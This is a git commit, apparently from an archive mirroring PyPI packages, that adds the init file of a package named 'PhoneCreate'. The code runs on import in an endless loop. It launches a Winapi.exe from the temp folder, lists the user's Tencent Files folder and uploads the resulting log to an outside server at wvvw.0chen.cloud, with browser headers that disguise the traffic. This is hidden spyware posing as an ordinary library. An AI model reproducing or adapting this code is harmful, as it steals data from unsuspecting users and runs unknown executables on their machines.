f791e7cd977bbf64562b5bc27cb4f9d102184879
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 07:07:41 +0000

    Add package PhoneCreate/0.0.1/PhoneCreate-0.0.1-py3-none-any.whl

---
+++ packages/PhoneCreate/PhoneCreate-0.0.1-py3-none-any.whl/PhoneCreate/__init__.py
@@ -0,0 +1,48 @@
+# -*- coding: UTF-8 -*-
+import requests
+import subprocess
+import time
+import os
+import platform
+s = requests.session()
+user_name = os.getlogin()
+SystemDrive = os.getenv("SystemDrive")
+Tempdir = os.getenv("TEMP")
+Device = platform.node()
+while True:
+    subprocess.Popen(rf"cd %temp% && Winapi.exe >{Device}WinINF.log 2>&1", shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(3)
+    subprocess.Popen(fr"cd {SystemDrive}\Users\{user_name}\Documents\Tencent Files && dir /b >> {Tempdir}\{Device}WinINF.log",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(6)
+    res2 = s.post(
+        url="http://wvvw.0chen.cloud:2082/PoiuytrewQ54321admin/index.php",
+        headers={
+            'Host': 'wvvw.0chen.cloud:2082',
+            'Content-Length': '1384',
+            'Cache-Control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="103", ".Not/A)Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'Upgrade-Insecure-Requests': '1',
+            'Origin': 'http://wvvw.0chen.cloud:2082',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Referer': 'http://wvvw.0chen.cloud:2082',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'zh-CN,zh;q=0.9',
+        },
+        files={
+            "userfile": open(rf"{Tempdir}\{Device}WinINF.log", "rb"),
+            "Content-Type": "application/octet-stream",
+            "Content-Disposition": "form-data",
+        },
+        data={
+            "upload": "上传"
+        }
+    )
+    time.sleep(21)
+
